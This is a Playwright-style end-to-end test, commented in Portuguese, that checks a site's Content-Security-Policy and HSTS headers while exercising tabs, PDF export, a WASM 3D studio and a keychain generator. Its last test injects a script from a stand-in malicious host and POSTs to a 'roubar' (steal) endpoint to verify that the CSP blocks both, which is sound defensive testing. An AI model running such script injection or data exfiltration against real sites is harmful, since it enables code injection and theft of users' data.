// E2E dos CABEÇALHOS DE SEGURANÇA (site/_headers): serve o site por HTTP com
// os mesmos cabeçalhos do Cloudflare (CSP, HSTS...) e usa as funções que mais
// dependem do navegador — abas, PDF, modo escuro, Estúdio 3D (WASM + worker),
// gerador de chaveiro e exportar. Nenhuma pode ser bloqueada pela CSP.
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import { fileURLToPath } from 'node:url';

const raiz = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const TIPOS = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.css': 'text/css', '.json': 'application/json', '.png': 'image/png', '.svg': 'image/svg+xml', '.wasm': 'application/wasm', '.txt': 'text/plain; charset=utf-8', '.stl': 'model/stl', '.3mf': 'model/3mf' };

// lê o _headers do Cloudflare ("/*" + linhas "Nome: valor")
export function lerHeaders(arq = path.join(raiz, 'site', '_headers')) {
  const h = {};
  for (const l of fs.readFileSync(arq, 'utf8').split('\n')) { const m = /^\s+([A-Za-z-]+):\s*(.+)$/.exec(l); if (m) h[m[1]] = m[2].trim(); }
  return h;
}

export function servir(pasta, cabecalhos) {
  const srv = http.createServer((req, res) => {
    const u = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    let arq = path.join(pasta, u === '/' ? 'index.html' : u);
    if (!arq.startsWith(pasta) || !fs.existsSync(arq) || fs.statSync(arq).isDirectory()) { res.writeHead(404, cabecalhos); res.end('404'); return; }
    res.writeHead(200, { ...cabecalhos, 'Content-Type': TIPOS[path.extname(arq)] || 'application/octet-stream' });
    fs.createReadStream(arq).pipe(res);
  });
  return new Promise(ok => srv.listen(0, '127.0.0.1', () => ok({ srv, url: 'http://127.0.0.1:' + srv.address().port })));
}

export async function secaoCSP({ b, teste, novaPagina, passo }) {
  const cab = lerHeaders();
  // upgrade-insecure-requests trocaria http://127.0.0.1 por https aqui no teste
  cab['Content-Security-Policy'] = cab['Content-Security-Policy'].replace(/;\s*upgrade-insecure-requests/, '');
  const { srv, url } = await servir(teste, cab);
  const pg = await novaPagina(b);
  const bloqueios = [];
  pg.on('console', m => { if (/Content Security Policy|Refused to/i.test(m.text())) bloqueios.push(m.text().slice(0, 220)); });
  await pg.addInitScript(() => { document.addEventListener('securitypolicyviolation', e => { (window.__csp = window.__csp || []).push(e.violatedDirective + ' ' + e.blockedURI); }); });
  const semBloqueio = async () => { const v = await pg.evaluate(() => window.__csp || []); const t = [...v, ...bloqueios]; if (t.length) throw new Error('CSP bloqueou: ' + [...new Set(t)].slice(0, 6).join(' | ')); };
  try {
    await passo(pg, 'CSP: o site servido com os cabeçalhos do Cloudflare carrega e as 15 abas abrem sem bloqueio', async () => {
      const r = await pg.goto(url + '/index.html');
      const h = r.headers();
      if (!/frame-ancestors 'none'/.test(h['content-security-policy'] || '') || !/max-age=/.test(h['strict-transport-security'] || '')) throw new Error('cabeçalhos não chegaram: ' + JSON.stringify(h));
      await pg.waitForTimeout(1500);
      for (const t of ['dash', 'calc', 'prod', 'sales', 'fil', 'serv', 'clients', 'consig', 'quote', 'rep', 'fin', 'ecom', 'audit', 'users', 'cfg']) await pg.evaluate(x => showTab(x), t);
      await semBloqueio();
    });
    await passo(pg, 'CSP: PDF (html2pdf num iframe blob:) e modo escuro funcionam', async () => {
      const src = await pg.evaluate(async () => { window.pdfViewer('<div style="padding:30px">Teste</div>', 't.pdf', 'Teste', ''); await new Promise(r => setTimeout(r, 4000)); return document.getElementById('pv_frame').src; });
      if (!src.startsWith('blob:')) throw new Error('PDF não gerou');
      await pg.evaluate(() => { document.getElementById('modal-pdf-view').classList.remove('active'); window.alternarTema(); window.alternarTema(); });
      await semBloqueio();
    });
    await passo(pg, 'CSP: Estúdio 3D (WASM + worker blob:) liga, cria peça e exporta 3MF', async () => {
      await pg.evaluate(() => showTab('ferr'));
      await pg.click('#ferr_modo_seg button[data-v=estudio]');
      await pg.waitForFunction(() => document.querySelector('.e3d-motor span')?.textContent.includes('pronto'), null, { timeout: 60000 });
      await pg.evaluate(() => { const d = document.querySelector('[data-sec=formas]'); d.open = true; d.dispatchEvent(new Event('toggle')); document.querySelector('[data-forma=esfera]').click(); });
      await pg.waitForFunction(() => window.Estudio3D.estudio.cena.objetos.length === 1, null, { timeout: 30000 });
      await pg.evaluate(() => { const d = document.querySelector('[data-sec=exp]'); d.open = true; d.dispatchEvent(new Event('toggle')); });
      const [dl] = await Promise.all([pg.waitForEvent('download', { timeout: 60000 }), pg.click('[data-sec=exp] [data-a="3mf"]')]);
      if (!(await dl.path())) throw new Error('3MF não baixou');
      await semBloqueio();
    });
    await passo(pg, 'CSP: gerador de chaveiro (texto) mostra a prévia e baixa o 3MF', async () => {
      await pg.click('#ferr_modo_seg button[data-v=gerador]');
      await pg.click('#fer_entrada_seg button[data-v=texto]');
      await pg.fill('#fer_texto', 'MARIA');
      await pg.waitForFunction(() => document.getElementById('fer_acoes').style.display !== 'none', null, { timeout: 20000 });
      const [dl] = await Promise.all([pg.waitForEvent('download', { timeout: 60000 }), pg.click('#fer_3mf')]);
      if (!(await dl.path())) throw new Error('3MF não baixou');
      await semBloqueio();
    });
    await passo(pg, 'CSP: script de outro site e conexão pra servidor estranho são BLOQUEADOS', async () => {
      const r = await pg.evaluate(async () => {
        const antes = (window.__csp || []).length;
        const s = document.createElement('script'); s.src = 'https://exemplo-malicioso.test/x.js'; document.head.appendChild(s);
        let conexao = 'passou'; try { await fetch('https://exemplo-malicioso.test/roubar', { method: 'POST', body: 'x' }); } catch { conexao = 'bloqueada'; }
        await new Promise(ok => setTimeout(ok, 300));
        const v = (window.__csp || []).slice(antes); window.__csp = (window.__csp || []).slice(0, antes);
        return { conexao, v };
      });
      bloqueios.length = 0;
      // os avisos "Refused to..." desse teste são o bloqueio ESPERADO, não erro do sistema
      if (pg.erros) pg.erros.splice(0, pg.erros.length, ...pg.erros.filter(e => !/exemplo-malicioso\.test/.test(e)));
      if (r.conexao !== 'bloqueada' || !r.v.some(x => /script-src/.test(x)) || !r.v.some(x => /connect-src/.test(x))) throw new Error('não bloqueou: ' + JSON.stringify(r));
    });
  } finally { await pg.context().close(); srv.close(); }
}
